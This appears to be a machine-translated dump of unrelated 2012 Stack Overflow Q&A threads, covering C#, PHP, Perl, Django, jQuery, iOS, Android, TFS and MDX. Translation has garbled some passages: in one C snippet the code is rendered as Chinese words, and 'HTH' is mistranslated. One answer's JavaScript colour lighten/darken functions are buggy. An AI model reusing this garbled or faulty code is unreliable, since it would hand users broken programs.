```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-18T23:18:46.377

Try the information I posted here: [How to set key value in CGrideView when grid is populated from table-view](https://stackoverflow.com/questions/8818059/how-to-set-key-value-in-cgrideview-when-grid-is-populated-from-table-view/9962204#9962204)

In essence, as long as your dataprovider to the CGridview provides the data->id in a form that it understands, it will auto handle the $data->id stuff for you automatically so that it's easily available to javascript.

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-04-16T12:23:29.323

`CGridView.rowHtmlOptionsExpression`未定义

我不认为我们可以使用`rowHtmlOptionsExpression`

# ios - iOS 中 ContentObserver 的等价物是什么？

> ID：11091636
> 
> 赞同：4
> 
> 时间：2012-06-18T21:52:52.617
> 
> 标签：ios, cocoa-touch

我在我的 android 应用程序中使用 ContentObserver 来在拍摄照片时接收通知。显然 iOS 不使用意图系统，那么是否有等效或替代的方法来做到这一点？如果可能的话，我宁愿不写一个完整的相机应用程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:35:53.807

这不太可能。即使是 iOS 上最新的 Google+ 应用程序，其***即时上传***功能也不会在拍摄照片时收到通知，它只是在应用程序运行时检查资产库，然后在后台运行时尽可能长时间，直到超时操作系统。

以下内容来自[Google+](http://support.google.com/plus/bin/answer.py?hl=en&answer=2453873)对此事的帮助：

> 注意：照片和视频将在 Google+ 应用程序打开时上传，并在之后的一小段时间内上传。

高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:15:47.593

看看[`UIImagePickerController`](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIImagePickerController_Class)。让用户在 iOS 上选择或拍照真的很容易。

iOS 中没有与 ContentObserver 等效的功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T22:01:43.533

当 iOS 上的另一个应用程序拍摄照片并将其保存到相机胶卷时，您无法在后台运行并收到通知。

也就是说，您实际上并不需要编写一个完整的相机应用程序来让用户从您的应用程序中拍照，或者从您正在运行的应用程序中访问相机胶卷。

# c# - 将 DataGrid 绑定到 DataSet 的 DataTable

> ID：11091638
> 
> 赞同：0
> 
> 时间：2012-06-18T21:53:12.130
> 
> 标签：c#, wpf, mvvm, datagrid, dataset

我正在使用 MVVM 处理 WPF，我需要将 DataSet 的表绑定到一些 DataGrid，但它不起作用。我的数据集有 2 个名为“table01”和“table02”的表。

在我的 XAML 中，我编写了以下内容：

```
. . . 
<UserControl.DataContext>
    <scr:MyViewModel/>
</UserControl.DataContext>
     <DataGrid Margin="0,0,0,0" Name="myGrid" ItemsSource="{Binding MyDataSet, Path=table01}" />
. . . 
```

但没有显示数据。

在我的视图模型中，我编写了以下内容：

```
. . . 
private DataSet myDataSet;
public DataSet MyDataSet
    {
        get
        { 
            return myDataSet;  
        }
        set
        {
            SetAndNotify(ref myDataSet, value, () => MyDataSet);
        }
    }
. . . 
```

为了澄清，我在视图模型构造函数中填充了我的数据集，即使我已经打印了我的数据集的内容并且它有数据并且我已经验证了与我的 DataContext 的连接并且它工作正常。那么，我做错了什么？

希望可以有人帮帮我。先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T06:32:40.030

如果您有一个无类型的数据集，您可以将您的表公开为像 keith 建议的属性或将您的绑定更改为

```
<DataGrid ItemsSource="{Binding MyDataSet.Tables[table01]}" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T23:57:28.657

您的通用 DataSet 对象上没有名为“table01”的属性，这是您要绑定的。

我建议也许将 MyDataSet.Tables[0] 公开为您的 ViewModel 上的自己的属性？

```
public DataTable MyTable
    {
        get
        { 
            return myDataSet.Tables[0];  
        }
    } 
```

# c# - 如何将多个线程仿射到一个 CPU 的共享值递增到 ++ 是三个指令时产生正确的结果？

> ID：11091645
> 
> 赞同：0
> 
> 时间：2012-06-18T21:53:42.337
> 
> 标签：c#, multithreading, caching, increment

我以为我对这个主题了解很多，但以下内容让我感到困惑。我知道在我运行它的特定 PC 上，“_x++”被转换为三个汇编指令（将值从内存移动到寄存器，在寄存器中递增，写回内存）。那么，为什么在地球上，当锁定到单个 CPU 时，增加值的线程不会在增加值的确切时间被抢占，但仍然在寄存器中并且没有写回内存？有人知道这个问题的答案吗？我猜这完全靠运气，但我无法完全证明这一点。

通过在 VS 的反汇编窗口中设置断点`inc eax`，然后在调试器中执行几个步骤，我能够使正确的结果消失，但这不是证据。不是一个坚实的。

[此代码故意不是线程安全的。这不是生产代码，它用于教育目的。我正试图深入研究这个主题。当然，如果没有缓存线，我们会得到很多，但仍然—— 三个指令，甚至没有一个未命中，这很奇怪！这是一个 4 核 CPU，x64。]

```
{
    private static int NumberOfThreads = 2;
    private const long IncrementIterations = 1000000000;

    private static int _x;

    static void Main(string[] args)
    {
        Process.GetCurrentProcess().ProcessorAffinity = (IntPtr)1;

        Console.WriteLine("Hit Enter");
        Console.ReadLine();

        while (true)
        {
            var barrier = new Barrier(NumberOfThreads);

            _x = 0;

            var threads = new List<Thread>();

            for (int i = 0; i < NumberOfThreads; i++)
            {
                var thread = new Thread(
                    delegate()
                    {
                        barrier.SignalAndWait();

                        for (int j = 0; j < IncrementIterations; j++)
                        {
                            _x++;
                        }
                    });

                thread.Start();

                threads.Add(thread);
            }

            BlockUntilAllThreadsQuit(threads);

            Console.WriteLine(_x);

            Console.WriteLine("Actual increments: " + (IncrementIterations * NumberOfThreads));

            if (_x != (IncrementIterations * NumberOfThreads))
            {
                Console.WriteLine("Observed: " + _x);
                break;
            }
        }

        Console.ReadLine();
    }

    private static void BlockUntilAllThreadsQuit(IEnumerable<Thread> threadsToWaitFor)
    {
        foreach (var thread in threadsToWaitFor)
        {
            thread.Join();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:35:23.673

如果您使用带有 _x 字段的类，而不是使用被提升到闭包的 _x 变量，您的程序会更清晰。话虽如此，如果线程在执行增量时被抢占，增量将不会是原子的，特别是在加载*完成*和存储*开始*之间。那是一个非常小的窗口。某些任意事件可能会在那个确切时刻发生并触发任务切换，但可能性不大。请注意，运行循环所需的时间完全有可能使普通的计时器滴答事件始终错过神奇的机会窗口。

如果您想更好地测试事情，我建议您在循环中添加一些代码以随机化一点时间（例如，使用`randThing`初始化为 1 的真正自动变量，执行以下操作：

```
  如果 (randthing & 0x20000000)
    随机 ^= 0x20043251); // 从帽子中挑选出来的号码；一个原始多项式
                              // 会更好。
  别的
    随机 <<= 1;

```

可能会导致循环时序以非周期性方式从一次迭代到下一次迭代略有变化。

# php - 如何在 php POST 中检索自定义 html 属性？

> ID：11091649
> 
> 赞同：0
> 
> 时间：2012-06-18T21:53:46.343
> 
> 标签：php, html, post

我有一个在 Div 中制作的自定义复选框

```
<div class="zs" name="toggle" state="on" id="zs"></div> 
```

该复选框具有开/关切换功能，并且状态属性在单击时更改为开/关。

div 放置在提交中，但我不知道如何从 php 获取 $_POST['toggle'] 以接收属性“state”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:06:14.153

浏览器只会发送`input`并`select`带有表单提交的标签，而不是`div`. 听起来您可能想将值存储在 hidden `input`IE 中：

```
<input type='hidden' name='toggle' value='on' /> 
```

然后添加到您已经使用的任何 javascript 以适当地设置值。

# regex - perl 交换两个单词

> ID：11091651
> 
> 赞同：1
> 
> 时间：2012-06-18T21:53:56.300
> 
> 标签：regex, perl

再会，

我在 Perl 中有一个简单的工作例程，可以交换两个单词：

即 John Doe -----> Doe John

这里是：

```
sub SwapTokens()
{
    my ($currentToken) = @_;

    $currentToken =~ s/([A-Za-z]+) ([A-Za-z]+)/$2 $1/;
    # $currentToken =~ s/(\u\L) (\u\L)/$2 $1/;
    return $currentToken;
} 
```

以下用法完全符合我的要求：

```
print &SwapTokens("John Doe"); 
```

但是当我取消注释 '$currentToken =~ s/(\u\L) (\u\L)/$2 $1/;

我得到一个错误。我错过了什么吗，看起来我的语法是正确的。

TIA,

科森

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T22:14:56.563

`\u`不是匹配大写字母的正则表达式原子。`\L`不是匹配多个小写字母的正则表达式原子。您正在寻找

```
s/(\p{Lu}\p{Ll}+) (\p{Lu}\p{Ll}+)/$2 $1/;

\p{Lu}  Uppercase letter.
\p{Ll}  Lowercase letter.

$ unichars '\p{Lu}' | head -n 5
 A  U+0041 LATIN CAPITAL LETTER A
 B  U+0042 LATIN CAPITAL LETTER B
 C  U+0043 LATIN CAPITAL LETTER C
 D  U+0044 LATIN CAPITAL LETTER D
 E  U+0045 LATIN CAPITAL LETTER E

$ unichars '\p{Ll}' | head -n 5
 a  U+0061 LATIN SMALL LETTER A
 b  U+0062 LATIN SMALL LETTER B
 c  U+0063 LATIN SMALL LETTER C
 d  U+0064 LATIN SMALL LETTER D
 e  U+0065 LATIN SMALL LETTER E 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-18T22:16:36.750

也许你正在寻找这样的东西：

```
sub swap_the_words {
  my ($processed_string) = @_;
  $processed_string =~ s/([A-Z][A-Za-z]+) ([A-Z][A-Za-z]+)/$2 $1/;
  return $processed_string;
}
print swap_the_words('John Doe'); # prints Doe John 
```

至于`\u`and `\l`，它们适用于修改*字符串*- 而不是正则表达式。例如，您可以像这样稍微改变您的脚本......

```
 $processed_string =~ s/([a-z]+) ([a-z]+)/\u\L$2\E \u\L$1\E/i;
  ...
  print swap_the_words('cOsOn hAcKeR'); # Hacker Coson 
```

......所以你的话不仅被交换，而且在适当的情况下也是如此。但请注意，这些修饰符用于`s///`操作符的替换部分。

* * *

## 回答 #3

> 赞同：-4
> 
> 时间：2012-06-18T22:02:40.100

`\L`意思是[“小写直到`\E`”](http://perldoc.perl.org/perlre.html)；即，它需要在某个时候跟随`\E`。您`\E`的正则表达式中没有，因此它无效；`\E`在每个获取要编译的脚本之后添加`\L`，尽管我不知道您实际上要在那里完成什么。

# python - Django - 带有变量字段名称的for循环

> ID：11091652
> 
> 赞同：0
> 
> 时间：2012-06-18T21:53:58.970
> 
> 标签：python, django, image, for-loop, django-forms

最近我开始尝试使用 Python 和 Django。我喜欢它，已经学到了很多东西，但还有很长的路要走……

我制作了一个包含 5 个图像字段的模型。在模型旁边，我还制作了一个表格来输入数据并保存它。到目前为止，一切都很好。现在我想写另一个表格来“编辑”上传的图片，意思是：

1.  上传新图片
2.  从数据库中删除“旧”图像

我编写了下面的代码来完成 1 个图像的工作：

```
if form.is_valid():
            form_image = form.cleaned_data['image_1']
            try:
                details = Model.objects.get(pk=pk)
                if details.image_1 != form_image:
                    details.image_1.delete(save=False)
            except: pass # when new photo then we do nothing, normal case
            form.save() 
```

但我正在努力解决以下问题：

1.  如何重写此代码以更新 5 个图像字段？因为在最坏的情况下，一个人可以编辑所有 5 个图像字段。我尝试使用“for循环”但从未成功。例如：

    ```
    image_list = [image_1, image_2, image_3, image_4, image_5]
    if form.is_valid():
        for image in image_list:
            form_image = form.cleaned_data[image]
            try:
                details = Model.objects.get(pk=pk)
                if details.image != form_image:
                    details.image.delete(save=False)
            except: pass # when new photo then we do nothing, normal case
            form.save() 
    ```

2.  有没有更智能的方法来编写这段逻辑。我对这段代码的一个问题是它检查图像的名称。当我有多个具有相同名称的图像时，这可能会出错......

希望有人可以提供一些反馈并再次指出我正确的方向。

非常感谢！

亲切的问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T21:35:12.810

您需要使用字符串：

```
image_list = ['image_1', 'image_2', 'image_3', 'image_4', 'image_5']

# or doing that dynamically as well:
image_list = ['image_%d' % i for i in xrange(1,6)] 
```

另外，从您的示例中，我不确定您`pk`每次都在哪里获得独特的价值。但是假设每个循环都应该产生一个不同的`details`对象来与那个特定的图像进行比较。

要考虑的一件事是你几乎不应该做毯子`try, except: pass`。它可以轻松掩盖您没有考虑到的错误：

```
try:
    details = Model.objects.get(pk=pk)
    ...
# django models have a special exception type
# when they don't exist.
except Model.DoesNotExist: 
    pass 
```

为了动态使用这些字符串名称作为变量查找，您只需要使用`getattr`

```
for image_name in image_list:
    ...
    # equiv to: details.image_1, details.image_2, ...
    if getattr(details, image_name, None) != form_image:
    ... 
```

# javascript - 在jquery中触发点击

> ID：11091658
> 
> 赞同：0
> 
> 时间：2012-06-18T21:54:27.303
> 
> 标签：javascript, jquery, button, triggers, click

嗨，我正在研究一个应该触发另一个按钮的按钮，但它似乎不起作用。（触发器代码在底部）

```
<script type="text/javascript" src="http://code.jquery.com/jquery.min.js"></script>
<script type="text/javascript" src="google-tts.min.js"></script>
<script type="text/javascript">
$(document).ready(function(){
    if (!window.GoogleTTS) {
       $("#error").text("Sorry, the google-tts script couldn't be loaded.");
       return;
    } else {
       var HTML = '\
        <div> \
            <label for="demo_language">Language:</label> \
            <select id="demo_language"> \
                <option value="" disabled="disabled">(Select language)</option> \
            </select> \
        </div> \
        <div> \
            <label for="demo_text">Text:</label> \
            <input type="text" size="30" id="demo_text" value=""> \
        </div> \
        <button id="demo_play">Play!</button> \
        <div id="testbutton">\
        <form id="target" method = "post">\
        <button id="go">Go!</button>\
        </form>\
        </div>\
        ';
      $("#tts_demo").html(HTML);
    }

    var googleTts = new window.GoogleTTS();

    // setup language options
    $.each(googleTts.languages(), function(key, value) {
        $('#demo_language').append('<option value="' + key + '">' + value + '</option>');
    });

    // play
    $("#demo_play").click(function() {
        googleTts.play($("#demo_text").val(), $("#demo_language").val(), function(err) {
            if (err) {
                alert(err.toString());
            }
        });
    });

    // defaults
    $("#demo_language").val('zh-CN');
    $("#demo_text").val('中文');

                $("#go").click(function () {
                    $("#demo_play").trigger('click')
                    alert('one')
                })
});
</script> 
```

有趣的是，触发似乎跳过了，它直接进入警报。我似乎无法弄清楚如何使它工作。请帮忙？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:57:01.150

您似乎在该代码块中缺少一些分号：

```
 $("#go").click(function () {
                $("#demo_play").trigger('click')
                alert('one')
            }) 
```

尝试这个：

```
 $("#go").click(function () {
                $("#demo_play").trigger('click');
                alert('one');
            }); 
```

# api - 树形结构的 API

> ID：11091660
> 
> 赞同：0
> 
> 时间：2012-06-18T21:54:31.603
> 
> 标签：api, rest, mongodb

我有一个网络服务，允许我的用户管理音乐节。每个节日都有一个地点，几个舞台，每个舞台上都有几位艺术家。

所以我有 4 个实体：节日、地点、舞台和艺术家，可以表示为树形结构。我需要一个简单的 CRUD。

在 REST API 术语中，显而易见的实现是有 4 个 URI（/festivals、/locations、/stages 和 /artists，可能后跟 /id），这些 URI 将通过 POST、PUT、GET 或 DELETE 进行请求。

但是，根据我的需要，地点、舞台和艺术家如果不与节日相关联，就没有兴趣。那么为什么我需要为这些实体实现 CRUD 方法呢？仅针对节日实体的 CRUD 还不够吗？

缺点：

*   我的 API 的客户端（网站、本地移动应用程序、其他服务......）无法读取我的节日的子实体。但是，正如我之前所说，我服务的子实体没有他们所属的节日就没有兴趣。因此，每个客户都必须获得节日、整个节日以及每个子实体。

*   即使他们只是修改了艺术家的名字，这些客户也需要更新整个节日。这似乎是最糟糕的缺点，但毕竟，发送我的节日的完整 json（最大几 kb）而不是会更短的部分 json 有那么糟糕吗？

优势 ：

*   我需要编写、测试和维护 4 种方法而不是 16 种方法（如果要管理的实体更多，假设它们保持这种简单的树形结构，甚至更多）。

从技术上讲，我将使用可爱的组合 node.js + mongodb 来执行此操作（它与情况没有太大关系，只是 mongodb 的超级树友好方面让我思考它）。

您如何看待这种方法？你看到这个想法的其他缺点吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T00:34:02.633

Your justification for having the smaller API looks sound. However, make sure you're also considering the complications of concurrent data access.

The larger the amount of data you package into a single unit, the more chances you have for change conflicts. For example, if you have two users modifying the same `festival`, one changing the stage name and the other changing an artist name, you could have a race condition where one update overwrites the changes made in the other. Obviously, you can have race conditions even if you have a more granular API, but merging everything into one unit amplifies the problem.

# javascript - 如何创建带点的滑块

> ID：11091665
> 
> 赞同：1
> 
> 时间：2012-06-18T21:54:54.203
> 
> 标签：javascript, html, css

我想在页面上有一个带有 10 个点的滑块。“项目。滑块”。我希望滑块中的每个项目都是一个点。所有 10 个点始终可见，只有 1 个点具有焦点。焦点每 5 秒更改一次到下一个点。在列表的末尾，焦点回到第一个点。

我试图有一个画布并在其中创建 10 个小圆圈等。

我怎样才能做到最好？

根据要求：http: [//jsfiddle.net/Jh73K/8/](http://jsfiddle.net/Jh73K/8/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T23:26:32.480

[在此处](http://manicmouse.com/image-free-apple-style-pagination-with-css3/)查看此链接。您可以使用相同的 CSS/HTML，然后使用以下 javascript 来更改活动项目。请记住，下面的代码适用于该链接中提到的 HTML。

```
$(document).ready(function() {
    setInterval(function() {
        var o = $("ol.pagination").find(".on").removeClass("on");
        if ($(o).is(':last-child')) $("ol.pagination").find("li:first-child").addClass("on");
        else $(o).next().addClass("on");
    }, 5000);
}); 
```

看看这是不是你想要的。编辑：顺便说一句，这里有一个相同的小提琴：http: [//jsfiddle.net/W8kZf/](http://jsfiddle.net/W8kZf/)。

# android - Android游戏中的捏缩放/双击手势

> ID：11091669
> 
> 赞同：1
> 
> 时间：2012-06-18T21:55:04.087
> 
> 标签：android, zooming, gesture, pinch, gomoku

我目前正在创建一个游戏（五子棋），用户需要将他的动作输入到 15x15 的方形网格中。我对 GUI 没有太多经验，所以我认为一个好的方法是创建大量 ImageView，对应于每个单独的正方形，当玩家移动时，它们会将背景图片从空白更改为 X 或 O。

但是，这在某些情况下会非常困难（手指太大和/或屏幕太小），所以我想实现捏合缩放或双击缩放功能。

我的问题是：是否可以在 ViewGroup 中实现这样的功能，它会放大其中的所有视图？如果是的话，还有其他方法可以为这个游戏实现 GUI 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-21T06:09:46.867

画布将是更好的选择。它将为您提供更大的灵活性，并且可以更新图形。您可以添加多个图像并在画布中组成网格。您还可以在[http://android-developers.blogspot.in/2010/06/making-sense-of-multitouch.html上轻松添加多点触控](http://android-developers.blogspot.in/2010/06/making-sense-of-multitouch.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T18:27:26.090

事实上，我也在为 Android 开发一个五子棋，嗯，有点。

正如 Alok 所建议的那样，我直接在自定义视图的画布中绘图。如果需要动画和流畅的运动，您也可以使用 SurfaceView，或者为了便携性甚至使用 OpenGL。

关于缩放，我没有实现捏缩放，只需双击即可。为什么？很抱歉没有更技术性，但有时当捏“奇怪”的事情时会发生，弄乱滚动和方形选择。用一只手玩也更容易。

题外话：祝人工智能好运，让它变得足够强大是相当困难的。

# c# - 无法将类型“int”隐式转换为“bool”

> ID：11091671
> 
> 赞同：1
> 
> 时间：2012-06-18T21:55:13.070
> 
> 标签：c#, md5, implicit-conversion

这是我的功能

```
public string getMD5hash(string input)
{
    //create a new instance of MD5 object
    MD5 md5Hasher = MD5.Create(); 
    //convert the input value to byte array
    byte[] data = md5Hasher.ComputeHash(Encoding.Default.GetBytes(input));
    StringBuilder sBuilder = new StringBuilder();

    for (int i = 0; data.Length -1 ; i++)
    {
        sBuilder.Append(data[i].ToString("x2"));
    }
    return sBuilder.ToString();
} 
```

我收到一个错误`data.Length`，无法将类型“int”隐式转换为“bool”

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T21:56:55.500

更改`for`循环并使第二个子句 a `bool`：

```
for (int i = 0; i < data.Length; i++)
{
    sBuilder.Append(data[i].ToString("x2"));
} 
```

注意变化`i < data.Length`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-18T21:57:24.093

您可能打算这样做：

```
for (int i = 0; i <= data.Length-1; i++) { ... } 
```

或同等学历：

```
for (int i = 0; i < data.Length; i++) { ... } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T21:57:35.033

问题出在 for 循环中。第二项需要是一个条件。那里的内容将评估为整数。因此你得到的错误。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-18T22:03:47.827

你想要这个 for 声明。

```
 for (int i = 0; i < data.Length; i++) { 
```

你有`data.Length-1`作为终止条件。那实际上是一个整数，终止条件需要是一个布尔值。

请注意，您也可以使用这种形式的循环，它更简单且效果也很好。

```
 foreach (byte b in data) {
            sBuilder.Append(b.ToString("x2"));
        } 
```

# command-line - 合并 TFS 2008 中的单个更改

> ID：11091680
> 
> 赞同：2
> 
> 时间：2012-06-18T21:55:53.880
> 
> 标签：command-line, tfs, tfs-power-tools

我正在寻找一种在 TFS 2008 中将单个变更集从一个分支快速合并到另一个分支的方法。迄今为止，我的公司已手动将更改向后移植到我们产品的旧版本，因此 TFS 中的分支之间不存在合并历史记录。

因此，尝试从 UI 中仅合并一个变更集会导致一团糟。它不只是合并我指定的变更集和以前的版本（这是我想要的）之间所做的更改，而是要合并所有内容。

是否有可能在 TFS 中实现这一点？基本上，我只想将一个变更集中的更改合并到目标文件中，而忽略源和目标之间的所有其他差异。如本文所述，我已尝试从 tf.exe 进行毫无根据的合并，[但这](https://stackoverflow.com/questions/1437304/in-tfs-how-do-i-do-a-baseless-merge-on-specific-changesets)仍然导致比变更集中更多的差异。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-15T18:34:06.753

假设您要合并变更集 1234。命令是：-

```
tf merge /r sourcebranchdir targetbranchdir /version:C1234~C1234 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-20T14:59:19.943

尽管我对 Visual Studio 命令提示符没有太多经验，但我可以看到`tf merge`有一个`/version`选项可以采用`Cnnnnnn`. where后面`Cnnnnnn`是`C`变更集的 id。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-07-12T17:17:19.020

虽然斯图尔特的答案中引用的“tf merge”命令有效，但 VS 2013 中也有 UI 可以直接执行此操作。

在合并向导中，对于“选择要合并的源分支更改”，选择“选定的更改集”。向导的下一步将显示尚未合并到目标分支的更改。

# php - PHP PDO Prepare 语句绑定疑难解答

> ID：11091687
> 
> 赞同：1
> 
> 时间：2012-06-18T21:56:44.053
> 
> 标签：php, pdo

开始了。我对 PHP 还是很陌生，我正在尝试学习 PDO。我试图弄清楚为什么

```
$validStartYear=-1;
echo $listString; //$listString = 'WHERE a regexp "Nissan"'
$queryToPrep='SELECT a FROM b WHERE a regexp "Nissan" ORDER BY start_year asc LIMIT 1;';
$query = $newMysql->prepare($queryToPrep);
$query->execute();
echo '<br/><br/>';
print_r($query);
echo '<br/>';
$row=$query->fetch();
echo $row[0],'<br/>'; 
```

输出

```
a regexp "Nissan"

PDOStatement Object ( [queryString] => SELECT a FROM b WHERE a regexp "Nissan" ORDER BY start_year asc LIMIT 1; )
1971 
```

尽管

```
$prepAgain='SELECT a FROM b WHERE ? ORDER BY a asc LIMIT 1;';
$query2= $newMysql->prepare($prepAgain);
$query2->bindParam(1, $listString, PDO::PARAM_STR);
$query2->execute();
echo '<br/>';
print_r($query2);
echo '<br/>';
$row2=$query2->fetch();
echo $row2[0]; 
```

输出

```
PDOStatement Object ( [queryString] => SELECT start_year FROM engine_kits WHERE ? ORDER BY start_year asc LIMIT 1; ) 
```

不返回任何值。我得到一个空数组，不管我有多大。语法似乎正确，但我错过了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:48:45.323

您只能通过 PDO 绑定实际值。您的第一个代码块有效，因为没有任何内容被错误地绑定。此外，您通常会想要使用 bindValue() 而不是 bindParam()。

尝试这样的事情

```
$car = 'Nissan'
$sql = 'SELECT a FROM b WHERE a regexp ? ORDER BY a asc LIMIT 1';
$stmnt = $newMysql->prepare( $sql );
$stmnt->bindValue( 1, $car, PDO::PARAM_STR ); 
```

# php - 如何在php中找到较浅或较暗版本的十六进制代码的十六进制代码

> ID：11091695
> 
> 赞同：1
> 
> 时间：2012-06-18T21:57:04.863
> 
> 标签：php, jquery, html, color-codes

我正在尝试实现这个人正在做[的](https://stackoverflow.com/questions/7037822/get-darker-color-hex-code-for-given-color-hex-code)事情，只在 PHP 或 jQuery 中。基本上我有一个十六进制颜色代码，比如#FF0000，它是红色的。我如何找到这种颜色的更深或更浅的十六进制颜色代码。

澄清：我想采用十六进制颜色代码（#FF0000），并找到该颜色代码较浅或较深阴影的正确十六进制颜色代码。

在 PHP 或 jQuery 中完成，当服务器处理页面时，我可以通过 PHP 更改颜色。

我不喜欢使用第三方 jQuery 插件来实现这一点，但如果它超级复杂，我会的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T22:04:16.277

当您说“较轻的版本”（或“较暗的版本”）时，有很多可能性。例如，您可以获取`#ff0000`并拥有 253 个“较暗版本”，范围从`#010000`到`#fe0000`. 同样，您可以拥有 253 个“较轻版本”，范围从`#ff0101`到`#fffefe`. 所以你的问题没有很好的定义。

我将在这个答案中假设“较浅版本”是指在颜色上覆盖 50% 透明白色的结果，而“较深”则相同但为黑色。

在任何情况下，您都应该始终从十六进制代码中提取数字开始：

```
// assuming input of form "#RRGGBB"
$col = Array(
    hexdec(substr($input,1,2)),
    hexdec(substr($input,3,2)),
    hexdec(substr($input,5,2))
); 
```

现在你有了它，你可以轻松地应用“覆盖”：

```
$darker = Array(
    $col[0]/2,
    $col[1]/2,
    $col[2]/2
);
$lighter = Array(
    255-(255-$col[0])/2,
    255-(255-$col[1])/2,
    255-(255-$col[2])/2
); 
```

然后将它们转换回十六进制代码是一件简单的事情：

```
$darker = "#".sprintf("%02X%02X%02X", $darker[0], $darker[1], $darker[2]);
$lighter = "#".sprintf("%02X%02X%02X", $lighter[0], $lighter[1], $lighter[2]); 
```

完毕！

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-07-22T18:03:40.480

我建议为此使用[TinyColor](http://bgrins.github.io/TinyColor/)颜色操作微框架。

> tinycolor.darken('#FF0000').toHexString()

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-18T22:04:29.583

您所要做的就是将十六进制代码拆分为其 RG 和 B 值，然后在它们上运行这部分操作脚本：

```
factor = percent/100;
r+=(255-r)*factor;
b+=(255-b)*factor;
g+=(255-g)*factor; 
```

因此，在纯 javascript 中，完整的功能将是这样的：

```
function lighten(color,percent){
    factor = percent/100;
    r = parseInt(color.substring(1,2),16);
    b = parseInt(color.substring(3,4),16);
    g = parseInt(color.substring(5,6),16);
    r+=(255-r)*factor;
    r=r.toString(16);
    if(r.length==1)
        r = '0'+r;
    b+=(255-b)*factor;
    b=b.toString(16);
    if(b.length==1)
        b = '0'+b;
    g+=(255-g)*factor;
    g=g.toString(16);
    if(g.length==1)
        g = '0'+g;
    return "#"+r+g+b;
} 
```

和

```
function darken(color,percent){
    factor = percent/100;
    r = parseInt(color.substring(1,2),16);
    b = parseInt(color.substring(3,4),16);
    g = parseInt(color.substring(5,6),16);
    r-=(255-r)*factor;
    r=r.toString(16);
    if(r.length==1)
        r = '0'+r;
    b-=(255-b)*factor;
    b=b.toString(16);
    if(b.length==1)
        b = '0'+b;
    g-=(255-g)*factor;
    g=g.toString(16);
    if(g.length==1)
        g = '0'+g;
    return "#"+r+g+b;
} 
```

您可以混合使用纯 javascript 和 jQuery，所以这应该可以正常工作。

# ssas - SSAS MDX 使用 IN 函数

> ID：11091696
> 
> 赞同：0
> 
> 时间：2012-06-18T21:57:07.200
> 
> 标签：ssas, mdx, calculated-field

我有一个衡量标准，这是对事实表中某个字段的不同计数。我现在正在尝试创建一个计算成员，该成员根据特定条件过滤计数。

我现在拥有的如下，

```
SUM({[Transactions].[Transaction Type].&[1],[Transactions].[Transaction Types].&[2]}, [Measures].[Distinct Count]) 
```

这将返回类型 1 的不同计数 + 类型 2 的不同计数

我正在寻找的是不同的计数 IN (1,2)

对于单个值/过滤器，我使用过

```
([Measures].[Distinct Count],[Transactions].[Transaction Types].&[20]) 
```

以上适用于 1 值，但我不确定如何为 2、3、4 等值编写 MDX 代码表达式

感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T18:06:07.410

我似乎已经想通了，

```
Aggregate(
 {
  ([Transactions].[Transaction Types].&[1]),
  ([Transactions].[Transaction Types].&[4])
 },
 [Measures].[Distinct Count]
) 
```

使用事实表上的 IN (1,4) 针对 SQL 查询验证上面的多维数据集结果会返回相同的结果。

# c# - 创建新实例时方法中的类型转换错误

> ID：11091698
> 
> 赞同：0
> 
> 时间：2012-06-18T21:57:10.220
> 
> 标签：c#, type-conversion

我只使用整数并想创建一个新的分数实例。我收到“无法隐式转换类型。'Fractions.Fraction' 到 'int'”的错误。问题与在此特定方法中创建新实例有关。我需要将方法中的所有三个值都返回给类。

我已经使用调试器逐步完成了代码，并验证了值是否正确更改。我只是无法让他们正确返回。错误出现在 reduce 方法的最后一行。对 C# 来说还是有些新意，如果有任何建议，将不胜感激。

```
public static int Reduce(int wholeNum, int numer, int denomi)
{
    int reduceWhole = (int)wholeNum;
    while(numer > denomi)
    {
        numer -= denomi;
        reduceWhole += 1;
    }
    while (denomi % numer == 0)
    {
        int factor =  (int)denomi/numer;
        numer = 1;
        denomi = factor;
    }
    return new Fraction(reduceWhole, numer, denomi);

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:59:04.937

然后只需将方法的签名更改为 return`Fraction`而不是`int`：

```
public static Fraction Reduce(int wholeNum, int numer, int denomi)
{
    // ....
    return new Fraction(reduceWhole, numer, denomi);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:59:47.880

您的方法`Reduce`声称返回 type 的值`int`，但您的返回行返回的 type 为`Fraction`。您需要将代码的第一行从更改`int`为`Fraction`：

```
public static Fraction Reduce(int wholeNum, int numer, int denomi)
{
    int reduceWhole = (int)wholeNum;
